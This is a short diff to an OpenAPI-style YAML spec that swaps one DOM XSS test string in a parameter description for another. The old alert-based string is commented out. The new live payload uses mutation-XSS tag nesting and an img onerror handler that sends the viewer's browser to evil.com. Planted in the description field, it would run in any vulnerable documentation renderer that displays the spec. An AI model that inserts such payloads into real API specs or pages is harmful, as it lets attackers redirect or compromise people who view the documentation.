@@ -28,7 +28,8 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('Dr0gas_DOM_XSS') src=1>"></form>
+            #<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('Dr0gas_DOM_XSS') src=1>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=window.location.href='https://evil.com') src=1>"></form>
 
           format: int64
           in: path
